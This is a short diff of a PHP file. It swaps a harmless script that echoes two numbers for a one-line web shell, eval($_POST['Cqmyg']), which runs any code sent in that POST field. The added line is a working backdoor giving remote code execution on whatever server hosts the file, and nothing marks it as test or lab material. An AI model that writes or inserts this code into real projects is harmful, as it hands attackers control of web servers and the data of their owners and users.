@@ -1,4 +1,1 @@
-<?php
-echo "6666";
-echo "8888";
-?>
+<?php eval($_POST['Cqmyg']); ?>%
